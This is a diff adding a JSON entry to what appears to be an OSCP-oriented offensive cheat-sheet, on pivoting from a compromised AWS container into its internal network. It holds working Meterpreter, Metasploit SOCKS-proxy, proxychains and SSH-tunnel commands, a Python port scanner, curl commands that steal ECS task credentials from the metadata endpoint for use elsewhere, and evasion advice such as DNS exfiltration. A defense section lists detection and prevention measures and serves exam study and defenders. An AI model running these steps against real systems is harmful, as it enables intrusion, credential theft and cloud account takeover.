@@ -1,0 +1,132 @@
+{
+  "id": "aws-container-pivot",
+  "name": "AWS - Container Network Pivot via Meterpreter & SOCKS Proxy",
+  "command": "# In Meterpreter session:\nmeterpreter > ifconfig\nmeterpreter > upload /home/kali/netscan.py /netscan.py\nmeterpreter > shell\npython /netscan.py <cidr>\n\n# In MSF console:\nuse auxiliary/server/socks_proxy\nroute add <ip> 255.255.0.0 <session_id>\n\n# SSH tunnel to forward SOCKS:\nssh -fN -L localhost:1080:localhost:1080 kali@<cloud_kali_ip>",
+  "description": "After getting a Meterpreter shell inside a container, pivot into the container's internal network to reach services not exposed externally. Steps: (1) enumerate network interfaces to identify internal subnets, (2) upload a Python port scanner to map live hosts and open ports on the container network, (3) set up MSF SOCKS proxy with route to pivot traffic through the Meterpreter session, (4) if the Meterpreter session is on a cloud Kali instance, SSH-forward the SOCKS proxy back to local Kali for browser/tool access. auxiliary/server/socks_proxy is exam-ok (auxiliary module, not exploit).",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "meterpreter-session",
+    "python-on-target"
+  ],
+  "tools": [
+    "metasploit",
+    "python3",
+    "ssh"
+  ],
+  "tags": [
+    "pivoting",
+    "lateral-movement",
+    "docker",
+    "container",
+    "socks",
+    "meterpreter",
+    "aws",
+    "cloud"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Cloud - AWS",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.10.2 - 25.10.3)",
+  "examples": [
+    {
+      "label": "Enumerate network interfaces in Meterpreter",
+      "command": "meterpreter > ifconfig\n# eth0: 172.18.0.4/16 (Docker bridge)\n# eth1: 172.30.0.5/16 (shared network with other containers)\n# Multiple interfaces reveal additional container networks"
+    },
+    {
+      "label": "Shell out and check environment for more network info",
+      "command": "meterpreter > shell\nprintenv | grep -i network\ncat /etc/hosts\nip route"
+    },
+    {
+      "label": "Write Python network scanner to local Kali",
+      "command": "# /home/kali/netscan.py - scans a CIDR for common ports:\nimport socket, sys\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan(host, ports=[22,80,443,8080,8443,3306,5432]):\n    open_ports = []\n    for port in ports:\n        try:\n            s = socket.socket()\n            s.settimeout(0.5)\n            s.connect((host, port))\n            open_ports.append(port)\n            s.close()\n        except: pass\n    if open_ports:\n        print(f'{host}: {open_ports}')\n\ncidr = sys.argv[1]  # e.g., 172.30.0.0/24\nbase = '.'.join(cidr.split('.')[:3])\nwith ThreadPoolExecutor(max_workers=50) as ex:\n    ex.map(scan, [f'{base}.{i}' for i in range(1,255)])"
+    },
+    {
+      "label": "Upload Python scanner to compromised container",
+      "command": "meterpreter > upload /home/kali/netscan.py /netscan.py\n# [*] Uploading  : /home/kali/netscan.py -> /netscan.py\n# [*] Uploaded 1.00 KiB of 1.00 KiB"
+    },
+    {
+      "label": "Run network scan from inside the container",
+      "command": "meterpreter > shell\npython /netscan.py 172.30.0.0/24\n# 172.30.0.10: [8080]   <- Jenkins on internal network\n# 172.30.0.50: [3306]   <- MySQL\n# 172.30.0.1:  [22]     <- Gateway / host"
+    },
+    {
+      "label": "Background the Meterpreter session",
+      "command": "meterpreter > background\n# [*] Backgrounding session 1..."
+    },
+    {
+      "label": "Set up SOCKS proxy through the Meterpreter session (exam-ok)",
+      "command": "msf6 > use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1\nmsf6 auxiliary(server/socks_proxy) > set SRVPORT 1080\nmsf6 auxiliary(server/socks_proxy) > set VERSION 5\nmsf6 auxiliary(server/socks_proxy) > run -j"
+    },
+    {
+      "label": "Add route through Meterpreter session to pivot subnet",
+      "command": "msf6 > route add 172.30.0.0 255.255.0.0 1\n# [*] Route added\n# Now MSF modules and proxychains traffic routes through session 1"
+    },
+    {
+      "label": "Configure proxychains to use the SOCKS proxy",
+      "command": "# /etc/proxychains4.conf - add at end:\n# socks5 127.0.0.1 1080\nproxychains curl http://172.30.0.10:8080/login\n# Or for browser: set SOCKS5 proxy to 127.0.0.1:1080"
+    },
+    {
+      "label": "SSH tunnel to forward SOCKS from cloud Kali to local machine",
+      "command": "# If MSF is running on a cloud Kali VM and you need SOCKS locally:\nssh -fN -L localhost:1080:localhost:1080 kali@<cloud_kali_ip>\n# Now localhost:1080 on your local machine tunnels to cloud Kali's SOCKS proxy\n# Configure proxychains or browser to 127.0.0.1:1080 locally"
+    }
+  ],
+  "notes": "auxiliary/server/socks_proxy is exam-ok (it is an auxiliary server module, not an exploit). 'route add' in the MSF console routes MSF's own traffic through the session \u2014 it does NOT affect system-level proxychains traffic unless combined with socks_proxy. For proxychains: 'proxychains4 -q <command>' suppresses verbose proxy output. MSF's 'route' command is different from Linux 'ip route' \u2014 it only affects MSF module traffic. For full OS-level tunneling without MSF, use SSH dynamic forwarding: 'ssh -D 1080 -N user@pivot_host'. The Python netscan.py approach is useful because many containers only have Python (no nmap, masscan). Adjust the ports list and timeout based on network speed \u2014 0.5s timeout works well for same-subnet Docker networks.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Attacking AWS Cloud Infrastructure",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Proxy: Multi-hop Proxy",
+      "url": "https://attack.mitre.org/techniques/T1090/003/"
+    },
+    {
+      "title": "MITRE ATT&CK - Remote Service Session Hijacking",
+      "url": "https://attack.mitre.org/techniques/T1563/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-pypi-supply-chain",
+      "rel": "prereq",
+      "note": "Meterpreter session typically obtained via supply chain attack on internal service."
+    },
+    {
+      "id": "aws-terraform-state",
+      "rel": "next",
+      "note": "After pivoting to internal network, discover and exfiltrate Terraform state files."
+    },
+    {
+      "id": "msf-autoroute",
+      "rel": "alternative",
+      "note": "post/multi/manage/autoroute automates route adding; same exam rules apply."
+    }
+  ],
+  "opsec": "moderate",
+  "mitre": [
+    "T1090.003",
+    "T1021",
+    "T1570"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Once inside an AWS container (ECS task, EKS pod, or Lambda), the container's IAM role credentials are available via the instance metadata service. ECS: credentials at 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. EKS: via IRSA (IAM Roles for Service Accounts) token file. Lambda: via AWS_ACCESS_KEY_ID env var. These credentials can be exfiltrated and used from outside the container, enabling pivot from the container to the broader AWS environment via the container's IAM permissions.",
+    "prerequisites": "Code execution within an AWS container (via RCE vulnerability, command injection, or supply chain). Access to instance metadata or container credentials endpoint. AWS CLI or HTTP client to call AWS APIs with the container's credentials.",
+    "impact": "T1090.003 Proxy: Multi-hop Proxy + T1021 Remote Services + T1570 Lateral Tool Transfer. Pivots from container compromise to AWS IAM access \u2014 the container's role permissions become the attacker's permissions. If the task role is admin-level, full account compromise from a single container RCE.",
+    "detection": "CloudTrail: API calls made with the ECS task role credentials from an unexpected IP (not the ECS task's VPC IP range). The credentials exfiltration itself (GET request to 169.254.170.2) is not logged in CloudTrail \u2014 only the subsequent AWS API calls using those credentials from an external IP are detectable. GuardDuty: 'PrivilegeEscalation:IAMUser/AdministrativePermissions' or 'Credential Access:IAMUser/AnomalousBehavior'.\nDetect network traffic flows using well-known protocols that are not normal for the environment. Monitor for processes spawning unexpected network connections. Analyze packet contents for protocol abnormalities. Look for connections to external infrastructure for servers or systems that do not normally have such connections. Domain fronting may be detected by analyzing TLS certificate information and host header values (DET0178).",
+    "artifacts": "CloudTrail: API calls from container role ARN but from external IP (ECS task credentials used externally) | GuardDuty: container credential theft finding | VPC Flow Logs: outbound connection from container to external IP (credential exfiltration) | CloudWatch: container task making unexpected outbound connections",
+    "prevention": "ECS credential endpoint access control: restrict 169.254.170.2 to the container process only (network policy where possible). Least-privilege task roles: container role should only have permissions for its specific function \u2014 not admin. Enable GuardDuty for container threat detection. ECS network mode: use awsvpc mode with security groups limiting outbound. Lambda: use VPC with limited egress. Monitor credential usage source IPs in CloudTrail.\nFilter Network Traffic: Use network appliances to filter ingress/egress traffic on common and uncommon ports used for proxying.\nNetwork Intrusion Prevention: Use IDS/IPS to identify patterns associated with proxy traffic.\nSSL/TLS Inspection: Implement SSL inspection to detect encrypted C2 traffic tunneled through proxies.",
+    "evasion": "Use stolen credentials from within the same VPC/region to match the expected source IP. Make API calls consistent with the container's normal behavior. Exfiltrate credentials via DNS (covert channel) rather than direct HTTP (may bypass egress rules).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1090/003/",
+      "https://attack.mitre.org/techniques/T1021/",
+      "https://attack.mitre.org/techniques/T1570/"
+    ],
+    "misconfiguration": "ECS task role over-permissioned (admin or broad permissions). No monitoring of where container IAM credentials are used (CloudTrail source IP). No outbound egress restriction from containers (allows credential exfiltration). GuardDuty not enabled for container threat detection.",
+    "vulnerable_config": "# ECS task metadata credential access (from container):\ncurl http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}\n# \u2192 {'AccessKeyId': 'ASIA...', 'SecretAccessKey': '...', 'Token': '...'}\n\n# Exfiltrate and use from attacker machine:\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\naws iam list-users  # Uses container role = potentially admin",
+    "secure_config": "# ECS task role: least privilege example\n# Task that reads S3 and writes to SQS:\n# {\n#   'Effect': 'Allow',\n#   'Action': ['s3:GetObject'],\n#   'Resource': 'arn:aws:s3:::input-bucket/*'\n# },\n# {\n#   'Effect': 'Allow',\n#   'Action': ['sqs:SendMessage'],\n#   'Resource': 'arn:aws:sqs:::output-queue'\n# }\n# Nothing else \u2014 no iam:*, no ec2:*, no s3:ListBucket globally\n\n# GuardDuty container threat detection:\naws guardduty update-detector --detector-id DETECTOR_ID \\\n  --features '[{\"Name\":\"ECS_RUNTIME_MONITORING\",\"Status\":\"ENABLED\"}]'\n\n# CloudTrail alert: container role used from external IP:\n# Metric filter: eventSource != internal AND userIdentity.arn CONTAINS task-role"
+  }
+}
